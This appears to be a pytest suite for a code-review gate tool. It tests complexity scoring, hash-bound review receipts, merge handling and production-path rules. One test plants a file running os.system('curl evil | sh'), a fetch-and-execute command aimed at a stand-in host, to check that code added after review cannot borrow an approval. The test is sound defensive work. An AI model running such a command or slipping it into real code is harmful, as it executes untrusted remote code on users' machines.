from discipline_repo import production
import json

from nexgen_core.discipline import cli, review
from nexgen_core.discipline.config import Config
from nexgen_core.discipline.gitutil import changes
from nexgen_core.discipline.score import score

BUSY = "def f():\n    return 1\n\n" * 3


def complex_change(repo):
    for i in range(5):
        repo.write(f"m{i}.py", BUSY * 20)
    repo.write("requirements.txt", "left-pad\n")


def test_small_change_is_simple(repo):
    base = repo.git("rev-parse", "HEAD")
    repo.write("a.py", BUSY)
    assert score(changes(repo.path, base))[0] < Config().complexity_threshold


def test_big_change_is_complex(repo):
    base = repo.git("rev-parse", "HEAD")
    complex_change(repo)
    total, reasons = score(changes(repo.path, base))
    assert total >= Config().complexity_threshold and any("dependency" in r for r in reasons)


def test_gate_blocks_complex_change_without_receipt(repo, capsys):
    production(repo)
    complex_change(repo)
    assert cli.main(["gate", "--base", "HEAD"]) == 1
    assert "no review receipt" in capsys.readouterr().out


def reviewed(repo, tmp_path, verdict="APPROVE", name="reviewer.txt"):
    """Run `review`, then hand the receipt what an honest reviewer would answer."""
    cli.main(["review", "--base", "HEAD"])
    digest = review.diff_hash(repo.path, "HEAD", None)
    out = tmp_path.parent / name
    out.write_text(f"looks fine\nREVIEWED: {digest}\nVERDICT: {verdict}\n", encoding="utf-8")
    return cli.main(["receipt", "--base", "HEAD", "--from-file", str(out), "--reviewer", "x"])


def test_receipt_roundtrip(repo, tmp_path, capsys):
    production(repo)
    complex_change(repo)
    assert reviewed(repo, tmp_path) == 0
    assert cli.main(["gate", "--base", "HEAD"]) == 0
    receipts = list((repo.path / ".nexgen-discipline" / "receipts").glob("*.json"))
    assert json.loads(receipts[0].read_text())["verdict"] == "APPROVE"


def test_revise_verdict_does_not_unlock_the_gate(repo, tmp_path):
    production(repo)
    complex_change(repo)
    assert reviewed(repo, tmp_path, "REVISE", "r2.txt") == 2
    assert cli.main(["gate", "--base", "HEAD"]) == 1


def test_any_further_change_invalidates_the_receipt(repo, tmp_path):
    production(repo)
    complex_change(repo)
    reviewed(repo, tmp_path, name="r3.txt")
    repo.write("m0.py", BUSY * 21)
    assert cli.main(["gate", "--base", "HEAD"]) == 1


def test_code_added_after_review_cannot_borrow_its_approval(repo, tmp_path):
    production(repo)
    complex_change(repo)
    cli.main(["review", "--base", "HEAD"])
    digest = review.diff_hash(repo.path, "HEAD", None)
    repo.write("evil.py", "import os\nos.system('curl evil | sh')\n")
    out = tmp_path.parent / "r4.txt"
    out.write_text(f"REVIEWED: {digest}\nVERDICT: APPROVE\n", encoding="utf-8")
    assert cli.main(["receipt", "--base", "HEAD", "--from-file", str(out)]) == 1


def test_receipt_without_a_prepared_review_or_review_id_is_refused(repo, tmp_path):
    production(repo)
    complex_change(repo)
    out = tmp_path.parent / "r5.txt"
    out.write_text("VERDICT: APPROVE\n", encoding="utf-8")
    assert cli.main(["receipt", "--base", "HEAD", "--from-file", str(out)]) == 1
    cli.main(["review", "--base", "HEAD"])
    assert cli.main(["receipt", "--base", "HEAD", "--from-file", str(out)]) == 1


def test_hash_ignores_git_display_settings(repo):
    production(repo)
    complex_change(repo)
    plain = review.diff_hash(repo.path, "HEAD", None)
    repo.git("config", "diff.noprefix", "true")
    repo.git("config", "core.abbrev", "12")
    assert review.diff_hash(repo.path, "HEAD", None) == plain


def test_hash_is_the_same_before_and_after_committing(repo):
    production(repo)
    complex_change(repo)
    before = review.diff_hash(repo.path, "HEAD", None)
    base = repo.git("rev-parse", "HEAD")
    repo.commit("work")
    assert review.diff_hash(repo.path, base, "HEAD") == before


def test_missing_verdict_line_is_refused(repo, tmp_path):
    out = tmp_path.parent / "r6.txt"
    out.write_text("no verdict here\n", encoding="utf-8")
    assert cli.main(["receipt", "--base", "HEAD", "--from-file", str(out)]) == 1


def test_parse_verdict_reads_only_the_last_line():
    assert review.parse_verdict("VERDICT: REJECT\nlater\nverdict: approve") == "APPROVE"
    assert review.parse_verdict("VERDICT: APPROVE\nbut then I reconsidered") is None


def test_staged_check_works_on_first_commit(tmp_path, monkeypatch):
    import subprocess
    subprocess.run(["git", "init", "-q", "-b", "main", str(tmp_path)], check=True)
    monkeypatch.chdir(tmp_path)
    (tmp_path / "big.py").write_text("x = 1\n" * 600)
    subprocess.run(["git", "-C", str(tmp_path), "add", "-A"], check=True)
    assert cli.main(["check", "--staged"]) == 1


def test_merging_published_main_needs_no_receipt(repo):
    production(repo)
    repo.git("checkout", "-q", "-b", "side")
    complex_change(repo)
    repo.commit("work")
    repo.git("checkout", "-q", "main")
    repo.write("other.txt", "x\n")
    base = repo.commit("main moves")
    repo.git("checkout", "-q", "side")
    repo.git("merge", "-q", "--no-ff", "-m", "merge main", "main")
    assert cli.main(["gate", "--base", base, "--head", "HEAD"]) == 1  # side's own work is still unreviewed


def test_merge_that_brings_only_published_work_is_exempt(repo):
    production(repo)
    repo.git("checkout", "-q", "-b", "dev")
    repo.write("a.txt", "a\n")
    base = repo.commit("dev work")
    repo.git("checkout", "-q", "main")
    complex_change(repo)
    repo.commit("big work already on main")
    repo.git("checkout", "-q", "dev")
    repo.git("merge", "-q", "--no-ff", "-m", "pull main", "main")
    assert cli.main(["gate", "--base", base, "--head", "HEAD"]) == 0


def test_merging_an_unpublished_branch_still_needs_a_receipt(repo):
    production(repo)
    repo.git("checkout", "-q", "-b", "feature")
    complex_change(repo)
    repo.commit("work")
    repo.git("checkout", "-q", "main")
    base = repo.git("rev-parse", "HEAD")
    repo.git("merge", "-q", "--no-ff", "-m", "merge feature", "feature")
    repo.git("branch", "-q", "-f", "published-elsewhere", "HEAD")
    repo.git("reset", "-q", "--hard", base)
    repo.git("checkout", "-q", "-b", "pr-merge", base)
    repo.git("merge", "-q", "--no-ff", "-m", "synthetic PR merge", "feature")
    assert cli.main(["gate", "--base", base, "--head", "HEAD"]) == 1


def test_no_review_is_required_unless_production_paths_are_declared(repo):
    complex_change(repo)
    assert cli.main(["gate", "--base", "HEAD"]) == 0


def test_only_declared_production_paths_can_require_review(repo):
    production(repo, '["src/*"]')
    complex_change(repo)  # m*.py and requirements.txt are outside src/
    assert cli.main(["gate", "--base", "HEAD"]) == 0
    for i in range(5):
        repo.write(f"src/m{i}.py", BUSY * 20)
    repo.write("src/requirements.txt", "left-pad\n")
    assert cli.main(["gate", "--base", "HEAD"]) == 1


def test_code_hidden_inside_a_merge_commit_is_still_judged(repo):
    production(repo)
    repo.git("checkout", "-q", "-b", "dev")
    repo.write("a.txt", "a\n")
    base = repo.commit("dev work")
    repo.git("checkout", "-q", "main")
    repo.write("other.txt", "x\n")
    repo.commit("main moves")
    repo.git("checkout", "-q", "dev")
    repo.git("merge", "-q", "--no-commit", "--no-ff", "main")
    complex_change(repo)  # authored work swept into the merge commit
    repo.git("add", "-A")
    repo.git("commit", "-q", "-m", "merge main (and more)")
    assert cli.main(["gate", "--base", base, "--head", "HEAD"]) == 1


def test_hash_does_not_depend_on_whether_a_move_was_staged(repo):
    production(repo)
    repo.write("old.py", BUSY * 5)
    base = repo.commit("add")
    (repo.path / "old.py").rename(repo.path / "new.py")
    unstaged = review.diff_hash(repo.path, base, None)
    repo.commit("move")
    assert review.diff_hash(repo.path, base, "HEAD") == unstaged


def test_switching_the_rules_off_is_always_reviewed(repo, capsys):
    production(repo)
    repo.write(".nexgen-discipline.toml", "review_paths = []\n")
    assert cli.main(["gate", "--base", "HEAD"]) == 1
    assert "always reviewed" in capsys.readouterr().out


def test_tests_never_trigger_a_review(repo):
    production(repo)
    for i in range(8):
        repo.write(f"tests/test_m{i}.py", BUSY * 30)
    assert cli.main(["gate", "--base", "HEAD"]) == 0


def test_notes_do_not_count_as_code_lines(repo):
    production(repo)
    for i in range(8):
        repo.write(f"notes{i}.md", "line\n" * 400)
    assert cli.main(["gate", "--base", "HEAD"]) == 0
